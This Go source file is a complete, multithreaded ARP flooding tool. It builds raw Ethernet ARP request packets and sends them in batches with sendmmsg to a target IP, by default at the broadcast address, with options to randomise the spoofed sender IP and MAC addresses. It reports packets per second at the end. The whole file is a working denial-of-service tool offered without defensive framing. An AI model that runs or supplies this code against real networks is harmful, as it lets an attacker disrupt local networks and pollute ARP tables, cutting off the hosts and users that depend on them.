// NParpT.go
package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

const (
	ethPAll = 0x0003
	ethLen  = 14
	arpLen  = 28
	ethSrcOff = 6
	arpSenderMCOff = ethLen + 8
	arpSenderIPOff = ethLen + 14

	BATCH = 32
)

const SYS_SENDMMSG = 307

type mmsghdr struct {
	Hdr syscall.Msghdr
	Len uint32
	_   [4]byte
}

func sendmmsg(fd int, msgs []mmsghdr) (int, syscall.Errno) {
	r, _, errno := syscall.Syscall6(SYS_SENDMMSG,
		uintptr(fd), uintptr(unsafe.Pointer(&msgs[0])), uintptr(len(msgs)), 0, 0, 0)
	return int(r), errno
}

func htons(v uint16) uint16 { return (v << 8) | (v >> 8) }

func parseMAC(s string) ([6]byte, bool) {
	var mac [6]byte
	parts := strings.Split(s, ":")
	if len(parts) != 6 { return mac, false }
	for i, p := range parts {
		v, err := strconv.ParseUint(p, 16, 8)
		if err != nil { return mac, false }
		mac[i] = byte(v)
	}
	return mac, true
}

func parseIPv4(s string) uint32 {
	ip := net.ParseIP(s).To4()
	if ip == nil { return 0 }
	return binary.BigEndian.Uint32(ip)
}

func findIfaceByIP(ip uint32) (int, error) {
	ifaces, err := net.Interfaces()
	if err != nil { return 0, err }
	for _, ifc := range ifaces {
		addrs, _ := ifc.Addrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok {
				ip4 := ipnet.IP.To4()
				if ip4 != nil && binary.BigEndian.Uint32(ip4) == ip { return ifc.Index, nil }
			}
		}
	}
	return 0, fmt.Errorf("interface not found")
}

func lcg(s *uint32) uint32 { *s = *s*1664525 + 1013904223; return *s }

func setupFd(ifIndex int, dmac [6]byte) (int, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(ethPAll)))
	if err != nil { return 0, err }
	_ = syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 4*1024*1024)
	_ = syscall.SetsockoptInt(fd, syscall.SOL_PACKET, 20, 1)
	var sllAddr [8]byte
	copy(sllAddr[:], dmac[:])
	sa := &syscall.SockaddrLinklayer{Protocol: htons(ethPAll), Ifindex: ifIndex, Halen: 6, Addr: sllAddr}
	if err := syscall.Bind(fd, sa); err != nil { syscall.Close(fd); return 0, err }
	return fd, nil
}

type workerCtx struct {
	fd        int
	counter   *uint64
	stop      *int32
	randomIP  bool
	randomMAC bool
	baseIP    uint32
	seed      uint32
	dstIP     uint32
	smac      [6]byte
	bufs      [][]byte
	msgs      []mmsghdr
	iovecs    []syscall.Iovec
}

func newWorker(fd int, counter *uint64, stop *int32, rip, rmac bool, baseIP, dstIP uint32,
	smac, dmac [6]byte, seed uint32) *workerCtx {
	const pktSize = ethLen + arpLen
	w := &workerCtx{
		fd: fd, counter: counter, stop: stop,
		randomIP: rip, randomMAC: rmac, baseIP: baseIP, seed: seed,
		dstIP: dstIP, smac: smac,
	}
	big := make([]byte, pktSize*BATCH)
	w.bufs = make([][]byte, BATCH)
	w.msgs = make([]mmsghdr, BATCH)
	w.iovecs = make([]syscall.Iovec, BATCH)
	for i := 0; i < BATCH; i++ {
		buf := big[i*pktSize : (i+1)*pktSize]
		w.bufs[i] = buf
		copy(buf[0:6], dmac[:])
		copy(buf[6:12], smac[:])
		binary.BigEndian.PutUint16(buf[12:14], 0x0806) // ARP
		binary.BigEndian.PutUint16(buf[14:16], 1)      // htype
		binary.BigEndian.PutUint16(buf[16:18], 0x0800) // ptype
		buf[18] = 6; buf[19] = 4
		binary.BigEndian.PutUint16(buf[20:22], 1)      // request
		copy(buf[22:28], smac[:])
		binary.BigEndian.PutUint32(buf[arpSenderIPOff:arpSenderIPOff+4], baseIP)
		// target_mac = 0
		binary.BigEndian.PutUint32(buf[38:42], dstIP)
		w.iovecs[i] = syscall.Iovec{Base: &buf[0], Len: uint64(pktSize)}
		w.msgs[i].Hdr.Iov = &w.iovecs[i]
		w.msgs[i].Hdr.Iovlen = 1
	}
	return w
}

func (w *workerCtx) run() {
	for atomic.LoadInt32(w.stop) == 0 {
		for i := 0; i < BATCH; i++ {
			buf := w.bufs[i]
			if w.randomIP {
				binary.BigEndian.PutUint32(buf[arpSenderIPOff:arpSenderIPOff+4], lcg(&w.seed)&0xFEFFFFFF)
			} else {
				binary.BigEndian.PutUint32(buf[arpSenderIPOff:arpSenderIPOff+4], w.baseIP)
			}
			if w.randomMAC {
				var m [6]byte
				r := (uint64(lcg(&w.seed)) << 32) | uint64(lcg(&w.seed))
				for j := 0; j < 6; j++ { m[j] = byte(r >> (8 * j)) }
				m[0] &= 0xFE
				copy(buf[ethSrcOff:ethSrcOff+6], m[:])
				copy(buf[arpSenderMCOff:arpSenderMCOff+6], m[:])
			}
		}
		n, errno := sendmmsg(w.fd, w.msgs)
		if errno == 0 { atomic.AddUint64(w.counter, uint64(n)) }
		runtime.KeepAlive(w)
	}
}

func main() {
	if len(os.Args) < 6 {
		fmt.Fprintf(os.Stderr, "Usage: %s <src_ip> <dst_ip> <port_ignored> <threads> <duration> [dst_mac] [--random-ip] [--random-mac]\n", os.Args[0])
		os.Exit(1)
	}
	srcIP := parseIPv4(os.Args[1]); dstIP := parseIPv4(os.Args[2])
	threads, _ := strconv.Atoi(os.Args[4]); duration, _ := strconv.Atoi(os.Args[5])
	if threads <= 0 { threads = 4 }; if threads > 256 { threads = 256 }
	dmac := [6]byte{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
	rip, rmac := false, false
	for i := 6; i < len(os.Args); i++ {
		switch os.Args[i] {
		case "--random-ip": rip = true
		case "--random-mac": rmac = true
		case "--packet-size":
			if i+1 < len(os.Args) { i++ }
		default:
			if m, ok := parseMAC(os.Args[i]); ok { dmac = m }
		}
	}
	var stop int32
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sigCh; atomic.StoreInt32(&stop, 1) }()
	ifIndex, err := findIfaceByIP(srcIP)
	if err != nil { fmt.Fprintln(os.Stderr, err); os.Exit(1) }
	ifc, err := net.InterfaceByIndex(ifIndex)
	if err != nil { fmt.Fprintln(os.Stderr, err); os.Exit(1) }
	var smac [6]byte
	copy(smac[:], ifc.HardwareAddr)
	var fds []int
	for i := 0; i < threads; i++ {
		fd, err := setupFd(ifIndex, dmac)
		if err != nil {
			for _, f := range fds { _ = syscall.Close(f) }
			fmt.Fprintln(os.Stderr, err); os.Exit(1)
		}
		fds = append(fds, fd)
	}
	var total uint64
	var wg sync.WaitGroup
	t0 := time.Now()
	base := uint32(t0.Unix())
	for i := 0; i < threads; i++ {
		w := newWorker(fds[i], &total, &stop, rip, rmac, srcIP, dstIP, smac, dmac,
			base+uint32(i)*123456789)
		wg.Add(1)
		go func(w *workerCtx) { defer wg.Done(); w.run() }(w)
	}
	if duration > 0 { time.Sleep(time.Duration(duration) * time.Second) } else {
		fmt.Println("Press Enter to stop..."); fmt.Scanln()
	}
	atomic.StoreInt32(&stop, 1)
	wg.Wait()
	for _, f := range fds { _ = syscall.Close(f) }
	ms := time.Since(t0).Milliseconds()
	pk := atomic.LoadUint64(&total)
	pps := 0.0
	if ms > 0 { pps = float64(pk) * 1000.0 / float64(ms) }
	fmt.Printf("Packets: %d\nPPS: %.0f\n", pk, pps)
}